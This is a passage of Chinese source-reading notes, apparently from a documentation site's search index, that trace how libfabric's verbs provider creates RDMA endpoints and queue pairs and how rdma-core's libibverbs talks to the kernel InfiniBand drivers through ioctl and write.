struct rdma_event_channel *channel;\n};\n</code></pre> <p>Endpoint \u6709\u591a\u79cd\u7c7b\u578b\uff0c\u5bf9\u5e94\u5230\u4e0d\u540c\u7684 QP \u79cd\u7c7b\uff1a</p> prov/verbs/src/verbs_info.c<pre><code>static inline int vrb_get_qp_cap(struct ibv_context *ctx,\n                    struct fi_info *info, uint32_t protocol) {\n    if (protocol == FI_PROTO_RDMA_CM_IB_XRC)\n        qp_type = IBV_QPT_XRC_SEND;\n    else\n        qp_type = (info-&gt;ep_attr-&gt;type != FI_EP_DGRAM) ?\n                    IBV_QPT_RC : IBV_QPT_UD;\n    init_attr.qp_type = qp_type;\n\n    qp = ibv_create_qp(pd, &amp;init_attr);\n    ibv_destroy_qp(qp);\n}\n</code></pre> <p><code>fi_endpoint()</code> \u76f4\u63a5\u8f6c\u4ea4\u5230 <code>domain-&gt;ops-&gt;endpoint()</code>\uff0c\u5728\u4e0a\u9762\u6211\u4eec\u770b\u5230\u8fd9\u662f <code>vrb_msg_domain_ops-&gt;endpoint</code>\uff0c\u5373 <code>vrb_open_ep()</code>\u3002\u8be5\u51fd\u6570\u6839\u636e EP \u7c7b\u578b\uff0c\u521b\u5efa\u5177\u4f53\u7684\u8d44\u6e90\uff1a</p> <ul> <li>\u6d88\u606f\u7aef\u70b9 (FI_EP_MSG)\uff1a<ul> <li>\u6839\u636e\u662f\u5426\u542f\u7528 XRC \u8bbe\u7f6e\u4e0d\u540c\u7684\u64cd\u4f5c\u96c6\uff08\u5982 vrb_msg_xrc_ep_msg_ops \u6216 vrb_msg_ep_msg_ops\uff09\u3002</li> <li>\u5904\u7406\u8fde\u63a5\u8bf7\u6c42\u6216\u88ab\u52a8\u7aef\u70b9\uff08PEP\uff09\u7684\u7279\u6b8a\u903b\u8f91\uff1a<ul> <li>\u5982\u679c\u6ca1\u6709 info-&gt;handle\uff0c\u521b\u5efa RDMA CM ID\u3002</li> <li>\u5982\u679c\u662f\u8fde\u63a5\u8bf7\u6c42 (FI_CLASS_CONNREQ)\uff0c\u5904\u7406 XRC \u6216\u666e\u901a\u8fde\u63a5\u3002</li> <li>\u5982\u679c\u662f\u88ab\u52a8\u7aef\u70b9 (FI_CLASS_PEP)\uff0c\u4f7f\u7528 <code>rdma_resolve_addr()</code> \u89e3\u6790\u5730\u5740\u5e76\u7ed1\u5b9a\u3002</li> </ul> </li> </ul> </li> <li>\u6570\u636e\u62a5\u7aef\u70b9 (FI_EP_DGRAM)\uff1a<ul> <li>\u8bbe\u7f6e\u670d\u52a1\u540d\u79f0\uff08\u4ece\u6e90\u5730\u5740\u6216\u751f\u6210\u552f\u4e00\u503c\uff09\u3002</li> <li>\u6839\u636e\u7ebf\u7a0b\u5b89\u5168\u6a21\u5f0f\u8bbe\u7f6e\u64cd\u4f5c\u96c6\uff08\u5982 vrb_dgram_msg_ops \u6216 vrb_dgram_msg_ops_ts\uff09\u3002</li> </ul> </li> </ul> prov/verbs/src/verbs_ep.c<pre><code>int vrb_open_ep(struct fid_domain *domain, struct fi_info *info,\n           struct fid_ep **ep_fid, void *context) {\n    struct vrb_ep *ep;\n    ep = vrb_alloc_init_ep(info, dom, context);\n    *ep_fid = &amp;ep-&gt;util_ep.ep_fid;\n    ep-&gt;util_ep.ep_fid.fid.ops = &amp;vrb_ep_ops;\n    ep-&gt;util_ep.ep_fid.ops = &amp;vrb_ep_base_ops;\n}\nstatic struct fi_ops vrb_ep_ops = {\n    .size = sizeof(struct fi_ops),\n    .close = vrb_ep_close,\n    .bind = vrb_ep_bind,\n    .control = vrb_ep_control,\n    .ops_open = vrb_ep_ops_open,\n};\n</code></pre> <p>\u68b3\u7406\u4e00\u4e0b\u54ea\u4e9b\u51fd\u6570\u5bf9 <code>vrb_ep</code> \u505a\u4e86\u4fee\u6539\uff1a</p> <ul> <li><code>vrb_alloc_init_ep()</code>\uff1a<ul> <li>\u5904\u7406 XRC\uff0c\u7279\u5316\u4e3a <code>struct vrb_xrc_ep</code></li> <li>\u5206\u914d WR \u7a7a\u95f4</li> <li>\u8c03\u7528 <code>ofi_endpoint_init()</code> \u901a\u7528\u521d\u59cb\u5316</li> </ul> </li> <li><code>vrb_ep_save_info_attr()</code>\uff1a\u5904\u7406 <code>ep-&gt;info_attr</code></li> <li><code>vrb_create_ep()</code>\uff1a\u521b\u5efa RDMA CM ID</li> </ul> <p><code>fi_enable()</code> \u8f6c\u4ea4\u4e3a <code>ep-&gt;fid.ops-&gt;control(&amp;ep-&gt;fid, FI_ENABLE, NULL)</code>\uff0c\u5373 <code>vrb_ep_ops-&gt;control</code>\uff0c\u4e5f\u5373 <code>vrb_ep_control()</code>\u3002\u6839\u636e command \u53c2\u6570\uff0c\u53c8\u88ab\u8f6c\u4ea4\u5230 <code>vrb_ep_enable(ep)</code>\u3002</p> <ul> <li>\u5bf9\u4e8e MSG \u7c7b\u578b\uff0c\u5c06\u4f7f\u7528 <code>rdma_create_qp()</code> \u5efa\u7acb RC \u8fde\u63a5</li> <li>\u5bf9\u4e8e DGRAM \u7c7b\u578b\uff0c\u5c06\u4f7f\u7528 <code>ibv_create_qp()</code> \u5efa\u7acb UD \u8fde\u63a5</li> </ul> prov/verbs/src/verbs_ep.c<pre><code>static int vrb_ep_enable(struct fid_ep *ep_fid) {\n    struct ibv_qp_init_attr attr = { 0 };\n    vrb_msg_ep_get_qp_attr(ep, &amp;attr);\n    switch (ep-&gt;util_ep.type) {\n    case FI_EP_MSG:\n        if (ep-&gt;srx) {\n        } else if (domain-&gt;ext_flags &amp; VRB_USE_XRC) {\n        }\n        if (ep-&gt;id-&gt;verbs &amp;&amp; ep-&gt;ibv_qp == NULL) {\n            ret = rdma_create_qp(ep-&gt;id, domain-&gt;pd, &amp;attr);\n        }\n    case FI_EP_DGRAM:\n        ret = vrb_create_dgram_ep(domain, ep, &amp;attr);\n    }\n}\n// \u8d1f\u8d23\u68c0\u67e5 ep \u53ca\u5176\u7236\u7c7b\u6301\u6709\u7684\u5404\u9879\u8d44\u6e90\uff0c\u636e\u6b64\u8bbe\u7f6e QP \u53c2\u6570\nvoid vrb_msg_ep_get_qp_attr(struct vrb_ep *ep,\n                struct ibv_qp_init_attr *attr) {\n    attr-&gt;qp_type = IBV_QPT_RC;\n    attr-&gt;sq_sig_all = 1;\n\n    if (ep-&gt;srx) {\n        attr-&gt;srq = ep-&gt;srx-&gt;srq;\n        attr-&gt;cap.max_recv_wr = 0;\n    }\n}\nstatic int vrb_create_dgram_ep(struct vrb_domain *domain, struct vrb_ep *ep,\n                  struct ibv_qp_init_attr *init_attr) {\n    init_attr-&gt;qp_type = IBV_QPT_UD;\n    ep-&gt;ibv_qp = ibv_create_qp(domain-&gt;pd, init_attr);\n}\n</code></pre> <p>\u5982\u679c\u652f\u6301 XRC\uff08eXtended Reliable Connections\uff09\uff0c\u5219\u4f7f\u7528 <code>rdma_create_qp_ex()</code> \u5efa\u7acb XRC \u8fde\u63a5\uff0c\u5176\u4e0a\u5c42\u8c03\u7528\u8def\u5f84\u4e8e\u4e0a\u9762\u6709\u6240\u4e0d\u540c\uff0c\u6682\u672a\u7814\u7a76\u3002</p> prov/verbs/src/verbs_domain_xrc.c<pre><code>static int vrb_create_ini_qp(struct vrb_xrc_ep *ep) {\n#if VERBS_HAVE_XRC\n    struct ibv_qp_init_attr_ex attr_ex;\n\n    attr_ex.qp_type = IBV_QPT_XRC_SEND;\n    attr_ex.comp_mask = IBV_QP_INIT_ATTR_PD;\n    attr_ex.pd = domain-&gt;pd;\n    attr_ex.qp_context = domain;\n    attr_ex.srq = NULL;\n\n    ret = rdma_create_qp_ex(ep-&gt;base_ep.id, &amp;attr_ex);\n    return FI_SUCCESS;\n#else /* VERBS_HAVE_XRC */\n    return -FI_ENOSYS;\n#endif /* !VERBS_HAVE_XRC */\n}\n</code></pre>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#active-\u548c-passive-ep","title":"Active \u548c Passive EP","text":"<p>\u5148\u770b Passive EP \u7684\u521b\u5efa\u8fc7\u7a0b\u3002<code>fi_passive_ep()</code> -&gt; <code>fabric-&gt;ops-&gt;passive_ep</code> -&gt; <code>vrb_passive_ep()</code>\uff1a</p> prov/verbs/src/verbs_ep.c<pre><code>int vrb_passive_ep(struct fid_fabric *fabric, struct fi_info *info,\n              struct fid_pep **pep, void *context) {\n    ret = rdma_create_id(NULL, &amp;_pep-&gt;id, &amp;_pep-&gt;pep_fid.fid,\n                 vrb_get_port_space(_pep-&gt;info-&gt;addr_format));\n    if (info-&gt;src_addr) {\n        ret = rdma_bind_addr(_pep-&gt;id, (struct sockaddr *) info-&gt;src_addr);\n    }\n}\n</code></pre>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u5982\u4f55\u542f\u7528-srq","title":"\u5982\u4f55\u542f\u7528 SRQ\uff1f","text":"<p>\u9664\u4e86 <code>vrb_open_ep()</code> \u521b\u5efa EP\uff0c\u8fd8\u6709\u4e00\u4e9b\u51fd\u6570\u4f1a\u4fee\u6539 EP\u3002\u5176\u4e2d <code>vrb_ep_bind()</code> \u662f\u552f\u4e00\u7ed9 <code>ep-&gt;srx</code> \u8d4b\u503c\u7684\u5730\u65b9\u3002\u8c03\u7528\u8def\u5f84\uff1a<code>fi_*ep_bind()</code> -&gt; <code>vrb_ep_ops.bind</code>\uff1a</p> prov/verbs/src/verbs_ep.c<pre><code>static int vrb_ep_bind(struct fid *fid, struct fid *bfid, uint64_t flags) {\n    switch (bfid-&gt;fclass) {\n    case FI_CLASS_CQ:\n    case FI_CLASS_EQ:\n    case FI_CLASS_SRX_CTX:\n        if (ep-&gt;util_ep.type != FI_EP_MSG)\n            return -FI_EINVAL;\n        ep-&gt;srx = container_of(bfid, struct vrb_srx, ep_fid.fid);\n    case FI_CLASS_AV:\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u7684 <code>struct vrb_srx</code> \u662f\u600e\u4e48\u6765\u7684\u5462\uff1f\u662f\u901a\u8fc7 <code>fi_srx_context()</code> \u521b\u5efa\u7684\uff0c\u5b83\u8f6c\u4ea4\u7ed9 <code>domain-&gt;ops-&gt;srx_ctx</code>\uff0c\u5373 <code>vrb_srq_context()</code>\uff0c\u8be5\u51fd\u6570\u8d1f\u8d23\u8c03\u7528 <code>ibv_create_srq()</code>\u3002</p> <p>\u5728\u6e90\u7801\u4e2d\uff0c\u6682\u65f6\u6ca1\u6709\u770b\u89c1\u81ea\u52a8\u521b\u5efa Shareable Receive Context \u7684\u5730\u65b9\uff0c\u63a8\u6d4b\u8fd9\u91cc\u5305\u88c5\u4e3a <code>fi_srx_context()</code> \u63a5\u53e3\u5e94\u8be5\u662f\u628a\u9009\u62e9\u6743\u7559\u7ed9\u7528\u6237\u4e86\uff0c\u9ed8\u8ba4\u5e76\u4e0d\u542f\u7528 SRQ\uff08XRC \u9664\u5916\uff0c\u672a\u4ed4\u7ec6\u67e5\u770b\u662f\u5426\u4f1a\u81ea\u52a8\u5206\u914d\uff09\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#verbs-provider","title":"Verbs Provider","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#iface-\u4e0e-device","title":"IFACE \u4e0e DEVICE","text":"<p>Verbs \u4f7f\u7528 RDMACM \u5efa\u94fe\uff0c\u9700\u8981\u4f7f\u7528 <code>rdma_bind_addr()</code> \u7ed1\u5b9a\u5230\u76f8\u5173\u7684\u7f51\u7edc\u63a5\u53e3\u3002\u56e0\u6b64\u6709 <code>vrb_getifaddrs()</code> \u6765\u67e5\u8be2\u63a5\u53e3\u4fe1\u606f\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u6765\u6392\u67e5\u4e00\u4e0b\u8be5\u51fd\u6570\u627e\u4e0d\u5230 IB \u8bbe\u5907\u7684\u7f51\u7edc\u63a5\u53e3\u7684\u95ee\u9898\u3002\u5df2\u77e5\u4f20\u9012\u7ed9\u8be5\u51fd\u6570\u7684 IB \u8bbe\u5907\u5217\u8868\u4e2d\u6709 <code>mlx5_bond_0</code>\uff0c\u4f7f\u7528 <code>show_gids</code> \u53ef\u4ee5\u770b\u5230\u5bf9\u5e94\u7f51\u7edc\u63a5\u53e3\u4e3a <code>bond0</code>\uff0c\u4f46\u8be5\u51fd\u6570\u6ca1\u6709\u627e\u5230\u8be5\u63a5\u53e3\u3002</p> <pre><code>vrb_getifaddrs()\nofi_getifaddrs() src/common.c\ngetifaddrs() /usr/include/ifaddrs.h\n</code></pre> <p>\u4f7f\u7528 <code>getifaddrs(3)</code> \u5e2e\u52a9\u9875\u7684\u793a\u4f8b\u4ee3\u7801\uff0c\u786e\u5b9e\u6709\u8fd4\u56de <code>bond0</code> \u63a5\u53e3\u3002\u63a5\u4e0b\u6765\u770b\u8be5\u51fd\u6570\u5982\u4f55\u5904\u7406\u8fd9\u4e9b\u63a5\u53e3\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/","title":"rdma-core \u4e0e linux/drivers/infiniband","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#rdma-core-\u4e0e-linuxdriversinfiniband","title":"rdma-core \u4e0e linux/drivers/infiniband","text":"<p>rdma-core \u662f\u7528\u6237\u7a7a\u95f4\u5e93\uff0c\u5b83\u4e0e Linux Kernel \u4e2d\u7684 InfiniBand \u5b50\u7cfb\u7edf\u7d27\u5bc6\u76f8\u8fde\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u7684\u6e90\u7801\u6211\u4eec\u5e94\u5f53\u653e\u5728\u4e00\u8d77\u770b\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#\u6574\u4f53\u7ed3\u6784","title":"\u6574\u4f53\u7ed3\u6784","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#rdma-core","title":"rdma-core","text":"<p>rdma-core \u6574\u4f53\u53ef\u4ee5\u5206\u4e3a API\u3001Utils \u548c Provider \u4e09\u4e2a\u90e8\u5206\uff1a</p> <ul> <li> <p>API\uff1a\u4ee5 <code>lib</code> \u5f00\u5934\u7684\u6587\u4ef6\u5939\uff0c\u5982 <code>libibverbs</code>\uff0c\u5b9a\u4e49\u7edf\u4e00\u7684\u63a5\u53e3\u4f9b\u7528\u6237\u7a0b\u5e8f\u4f7f\u7528\u3002</p> libibverbs/verbs.h<pre><code>static inline int ibv_post_send(struct ibv_qp *qp, struct ibv_send_wr *wr,\n        struct ibv_send_wr **bad_wr)\n{\n    return qp-&gt;context-&gt;ops.post_send(qp, wr, bad_wr);\n}\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7684\u5f88\u591a API \u90fd\u901a\u8fc7 static \u548c inline \u63a7\u5236\u53ef\u89c1\u6027\u3002</p> </li> <li> <p>Provider\uff1a\u4f9b\u5404\u5382\u5546\u5b9e\u73b0\u5177\u4f53\u7684\u903b\u8f91\u3002\u5728\u8fd9\u91cc\uff0c\u51fd\u6570\u8868\u88ab\u6307\u5411\u5177\u4f53\u7684\u903b\u8f91\u3002</p> providers/mlx5/mlx5.c<pre><code>static const struct verbs_context_ops mlx5_ctx_common_ops = {\n    .create_qp = mlx5_create_qp,\n    //...\n\n}\n</code></pre> </li> <li> <p>Utils\uff1a\u4e00\u4e9b\u5b9e\u7528\u5de5\u5177\uff0c\u5982 <code>infiniband-diags</code></p> </li> </ul> <p>\u8fd9\u6837\u7684\u7ed3\u6784\u6211\u4eec\u5df2\u7ecf\u89c1\u5230\u5f88\u591a\u4e86\uff0cUCX\u3001libfabric \u90fd\u4e0e\u6b64\u7c7b\u4f3c\u3002</p> <p>rdma-core \u4f7f\u7528 CMake \u6784\u5efa\uff0c\u4e00\u4e9b\u8981\u70b9\uff1a</p> <ul> <li> <p><code>libibverbs/libibverbs.map.in</code> \u7b49\u6587\u4ef6\u5b9a\u4e49\u4e86\u5e93\u7684\u53ef\u89c1\u7b26\u53f7\uff0c\u901a\u8fc7 CMake \u4e2d\u7684\u81ea\u5b9a\u4e49\u51fd\u6570 <code>rdma_set_library_map</code> \u6dfb\u52a0\u7f16\u8bd1\u5668\u9009\u9879\u5b9e\u73b0\uff1a</p> <pre><code>-Wl,--version-script,${VERSION_SCRIPT}\n</code></pre> <p>Version Script \u7528\u4e8e\u660e\u786e\u544a\u8bc9\u94fe\u63a5\u5668\u8981\u4ece\u751f\u6210\u7684\u5bf9\u8c61\u4e2d\u5bfc\u51fa\u54ea\u4e9b\u7b26\u53f7\uff0c\u4ee5\u53ca\u5c06\u7248\u672c\u540d\u79f0\u4e0e\u63a5\u53e3\u5173\u8054\u8d77\u6765\uff0c\u4ece\u800c\u5141\u8bb8\u8fdb\u884c\u4e0d\u517c\u5bb9\u7684\u66f4\u6539\u800c\u4e0d\u4f1a\u7834\u574f ABI\u3002\u8be6\u89c1 LD Version Scripts (GNU Gnulib)\u3002</p> </li> </ul>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#linuxdriversinfiniband","title":"linux/drivers/infiniband","text":"<p>\u5206\u4e3a\u4e09\u5c42\uff1a</p> <ul> <li>Upper Layer Protocol</li> <li>sw</li> <li>hw</li> </ul>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u7684\u4ea4\u4e92","title":"\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u7684\u4ea4\u4e92","text":"<p>\u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\u8fd0\u884c\u5728\u7528\u6237\u6001\u7684 rdma-core \u662f\u5982\u4f55\u4e0e\u5185\u6838\u6001\u4ea4\u4e92\u7684\u3002\u5728\u300aLinux Device Drivers\u300b\u4e2d\u6211\u4eec\u4e86\u89e3\u5230\uff0c\u8bbe\u5907\u9a71\u52a8\u9664\u4e86\u652f\u6301 <code>write()</code> \u548c <code>read()</code> \u64cd\u4f5c\uff0c\u8fd8\u4f1a\u4f7f\u7528 <code>ioctl()</code> \u6267\u884c\u590d\u6742\u7684\u63a7\u5236\u903b\u8f91\u3002rdma-core \u4e5f\u57fa\u4e8e\u8fd9\u4e24\u79cd\u65b9\u5f0f\u4e0e\u8bbe\u5907\u9a71\u52a8\u4ea4\u4e92\u3002</p> <p>\u4ee5 libibverbs \u4e2d\u7684 <code>ibv_create_qp()</code> \u4e3a\u4f8b\uff0cmlx5 \u9a71\u52a8\u7684\u8c03\u7528\u94fe\u5982\u4e0b\uff1a</p> <pre><code>ibv_create_qp() (libibverbs/verbs.c)\n\nget_ops()-&gt;create_qp() = mlx5_ctx_common_ops.create_qp()  (providers/mlx5/mlx5.c)\n\nmlx5_create_qp() (providers/mlx5/verbs.c)\n\ncreate_qp() (providers/mlx5/verbs.c)\n\nibv_cmd_create_qp_ex() (libibverbs/cmd_qp.c)\n\nibv_icmd_create_qp() (libibverbs/cmd_qp.c)\n</code></pre> <p>\u5728 <code>ibv_icmd_*()</code> \u4e2d\uff0c\u4e00\u822c\u4f1a\u4f18\u5148\u5c1d\u8bd5 ioctl\uff0c\u5982\u679c\u4e0d\u884c\u518d fallback \u5230 write\uff1a</p> libibverbs/cmd_qp.c<pre><code>static int ibv_icmd_create_qp(struct ibv_context *context,\n                struct verbs_qp *vqp,\n                struct ibv_qp *qp_in,\n                struct ibv_qp_init_attr_ex *attr_ex,\n                struct ibv_command_buffer *link) {\n    switch (execute_ioctl_fallback(context, create_qp, cmdb, &amp;ret)) {\n        case TRY_WRITE: {\n        ret = execute_write_bufs(\n            context, IB_USER_VERBS_CMD_CREATE_QP, req, resp);\n        }\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u7684 <code>execute_*</code> \u90fd\u662f\u5934\u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u5b8f\uff0c\u5b83\u4eec\u6267\u884c\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u548c\u7c7b\u578b\u7684\u8f6c\u6362\uff08\u6bd4\u5982 container_of\u3001assert \u7b49\uff09\uff0c\u7136\u540e\u6267\u884c\u4e0b\u9762\u7684\u5177\u4f53\u8c03\u7528\uff1a</p> <ul> <li> <p>\u9996\u5148\u5c1d\u8bd5 ioctl</p> libibverbs/cmd_fallback.c<pre><code>enum write_fallback _execute_ioctl_fallback(struct ibv_context *ctx,\n                unsigned int cmd_bit,\n                struct ibv_command_buffer *cmdb,\n                int *ret) {\n    *ret = execute_ioctl(ctx, cmdb);\n    if (*ret == ENOTTY) {\n        /* ENOTTY means the ioctl framework is entirely absent */\n        bitmap_fill(priv-&gt;unsupported_ioctls, VERBS_OPS_NUM);\n        return _check_legacy(cmdb, ret);\n    }\n}\n</code></pre> libibverbs/cmd_ioctl.c<pre><code>int execute_ioctl(struct ibv_context *context, struct ibv_command_buffer *cmd) {\n    if (ioctl(context-&gt;cmd_fd, RDMA_VERBS_IOCTL, &amp;cmd-&gt;hdr))\n        return errno;\n}\n</code></pre> </li> <li> <p>\u5426\u5219\u5c1d\u8bd5 write</p> libibverbs/cmd_fallback.c<pre><code>int _execute_cmd_write(struct ibv_context *ctx, unsigned int write_method,\n                void *vreq, size_t core_req_size,\n                size_t req_size, void *resp, size_t core_resp_size,\n                size_t resp_size) {\n    if (write(ctx-&gt;cmd_fd, vreq, req_size) != req_size)\n        return errno;\n}\n</code></pre> </li> </ul>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#libibverbs","title":"libibverbs","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#\u5b9e\u73b0\u7b80\u8ff0","title":"\u5b9e\u73b0\u7b80\u8ff0","text":"<ul> <li> <p>\u8f6c\u4ea4 Provider \u5c42\u7684\uff1a</p> <p>\u4e00\u822c\u5728 <code>libibverbs/verbs.h</code> \u4e2d\u76f4\u63a5\u5b9a\u4e49\u4e3a <code>static inline</code>\uff1a</p> <pre><code>ibv_wr_*\n...\n</code></pre> </li> <li> <p>\u901a\u8fc7 <code>ibv_cmd_*</code> \u8f6c\u4ea4\u5185\u6838\u6001\u7684\uff1a</p> <pre><code>ibv_alloc_pd -&gt; mlx5_alloc_pd -&gt; ibv_cmd_alloc_pd\nibv_reg_mr -&gt; mlx5_reg_mr -&gt; ibv_cmd_reg_mr\nibv_post_send -&gt; mlx5_post_send -&gt; ibv_cmd_post_send\n...\n</code></pre> </li> <li> <p><code>device.c</code> \u4e2d\u7684\uff1a</p> <pre><code>struct _ibv_device_ops {\n    struct ibv_context *    (*_dummy1)(struct ibv_device *device, int cmd_fd);\n    void            (*_dummy2)(struct ibv_context *context);\n};\nstruct ibv_device{\n    struct _ibv_device_ops _ops;\n    enum ibv_node_type    node_type;\n    enum ibv_transport_type    transport_type;\n    /* Name of underlying kernel IB device, eg \"mthca0\" */\n    char            name[IBV_SYSFS_NAME_MAX];\n    /* Name of uverbs device, eg \"uverbs0\" */\n    char            dev_name[IBV_SYSFS_NAME_MAX];\n    /* Path to infiniband_verbs class device in sysfs */\n    char            dev_path[IBV_SYSFS_PATH_MAX];\n    /* Path to infiniband class device in sysfs */\n    char            ibdev_path[IBV_SYSFS_PATH_MAX];\n}\n</code></pre> <ul> <li> <p><code>struct ibv_device **ibv_get_device_list(int *num_devices);</code>\uff1a</p> <ul> <li>\u901a\u8fc7 Netlink \u6216 sysfs\uff08\u5982 <code>/sys/class/infiniband_verbs/uverbs0/ibdev</code>\uff09\u67e5\u627e\u8bbe\u5907\uff0c\u83b7\u5f97 <code>sysfs_list</code></li> <li><code>load_drivers()</code> \u52a0\u8f7d\u6240\u6709 Provider \u52a8\u6001\u94fe\u63a5\u5e93 <code>lib*-rdmav**.so</code>\uff08<code>load_drivers()</code>\uff09\uff0c\u5b58\u653e\u5230\u5168\u5c40\u94fe\u8868 <code>driver_list</code>\uff0c\u7c7b\u578b\u4e3a <code>ibv_driver</code></li> <li> <p>\u5bf9\u5217\u8868 <code>sysfs_list</code> \u4e2d\u6bcf\u4e2a\u8bbe\u5907\uff0c\u5c1d\u8bd5 <code>driver_list</code> \u4e2d\u7684\u6240\u6709\u9a71\u52a8\uff0c\u5982\u679c\u6210\u529f\u5c31\u6dfb\u52a0\u5230\u5168\u5c40\u94fe\u8868 <code>device_list</code>\uff0c\u7c7b\u578b\u4e3a <code>ibv_device</code></p> <pre><code>try_all_drivers(&amp;sysfs_list, device_list, &amp;num_devices);\nvdev = try_drivers(sysfs_dev); list_add(device_list, &amp;vdev-&gt;entry);\ndev = try_driver(driver-&gt;ops, sysfs_dev);\n</code></pre> <p>\u7531\u9a71\u52a8\u5b8c\u6210 <code>verbs_device</code> \u548c <code>ibv_device</code> \u7684\u521d\u59cb\u5316\uff1a</p> <pre><code>vdev = ops-&gt;alloc_device(sysfs_dev);\nvdev-&gt;ops = ops;\ndev = &amp;vdev-&gt;device;\nstrcpy(dev-&gt;name,       sysfs_dev-&gt;ibdev_name);\nvdev-&gt;sysfs = sysfs_dev;\n</code></pre> </li> <li> <p>\u5c06\u5168\u5c40\u94fe\u8868 <code>device_list</code> \u7684\u5143\u7d20\u6307\u9488\u62f7\u8d1d\u8fd4\u56de\u3001\u9012\u589e\u5143\u7d20\u7684\u5f15\u7528\u8ba1\u6570\uff08<code>ibverbs_device_hold</code>\uff09</p> </li> </ul> </li> <li> <p><code>void ibv_free_device_list(struct ibv_device **list);</code>\uff1a\u9012\u51cf\u5143\u7d20\u5f15\u7528\u8ba1\u6570\uff08<code>ibverbs_device_put</code>\uff09</p> </li> <li> <p><code>struct ibv_context *ibv_open_device(struct ibv_device *device);</code>\uff1a</p> <ul> <li>\u83b7\u53d6\u7236\u7ed3\u6784 <code>verbs_device</code>,\u901a\u8fc7 <code>ops</code> \u4f7f\u7528\u76f8\u5e94 Driver \u7684\u80fd\u529b</li> <li>\u62ff\u5230 Driver \u7684 <code>cmd_fd</code>\uff0c\u8c03\u7528\u8bbe\u5907\u7279\u5b9a\u7684 <code>alloc_context</code> \u51fd\u6570</li> <li> <p>\u901a\u8fc7\u4e0b\u9762\u7684\u901a\u7528\u63a5\u53e3\u8bbe\u7f6e <code>verbs_context</code> \u7684 <code>ops</code>\uff1a</p> <pre><code>void verbs_set_ops(struct verbs_context *vctx,\n    const struct verbs_context_ops *ops);\n</code></pre> </li> </ul> </li> <li> <p>\u8fc7\u4e8e\u7b80\u5355\u65e0\u9700\u4ecb\u7ecd\u7684\uff1a</p> <pre><code>ibv_get_device_name\nibv_get_device_guid\n</code></pre> </li> </ul> </li> <li> <p><code>verbs.c</code> \u4e2d\u7684\uff1a</p> <ul> <li> <p><code>struct ibv_mr *ibv_reg_mr(struct ibv_pd *pd, void *addr, size_t length, int access);</code></p> <p>\u8fd9\u662f\u4e00\u4e2a\u5f88\u5173\u952e\u7684\u51fd\u6570\uff0c\u6d89\u53ca IOVA \u7684\u8f6c\u6362\u3002</p> </li> <li> <p>`</p> </li> </ul> </li> </ul>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#mr-\u6ce8\u518c","title":"MR \u6ce8\u518c","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#ibv_post_send-\u7684\u53ef\u89c1\u6027","title":"<code>ibv_post_send</code> \u7684\u53ef\u89c1\u6027","text":"<p>\u6709\u8da3\u7684\u662f\uff0c<code>ibv_post_send</code> \u4e0d\u662f\u5bfc\u51fa\u7b26\u53f7\u3002</p> <p>\u6211\u4eec\u77e5\u9053\u8fd9\u662f\u5904\u4e8e\u6570\u636e\u8def\u5f84\u4e0a\u3001\u4e0d\u7528\u9677\u5165\u5185\u6838\u6001\u7684 Verbs\u3002\u6211\u8ba4\u4e3a\u8fd9\u91cc\u4e0d\u5c06\u5176\u8bbe\u4e3a\u5bfc\u51fa\u7b26\u53f7\u7684\u539f\u56e0\u662f\uff1a\u5c06\u5176\u76f4\u63a5 Forward \u5230 Provider \u5c42\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <pre><code>---\nconfig:\n    layout: elk\n---\nflowchart\n    n1[\"App\"]\n    n2[\"libmlx5\"]\n    subgraph s1[\"Kernel\"]\n        n7[\"mlx5_ib\"]\n        n6[\"ib_core\"]\n        n3[\"ib_uverbs\"]\n    end\n    n4[\"libibverbs\"]\n    n1 --- n4\n    n1 ---|\"Fast Path\"| n2\n    n4 --- s1\n    n5[\"Hardware\"]\n    n2 --- n5\n    s1 --- n5\n    n3 --- n6\n    n6 --- n7</code></pre> <p>\u4f46\u662f\u5982\u679c\u8ffd\u8e2a\u4e0b\u53bb\u4f1a\u53d1\u73b0\u5f88\u5947\u602a\uff0c<code>mlx5_post_send</code> \u540c\u6837\u4e0d\u662f\u5bfc\u51fa\u51fd\u6570\uff0c\u518d\u4e0b\u4e00\u5c42\u7684 <code>_mlx5_post_send</code> \u5df2\u7ecf\u662f <code>inline</code> 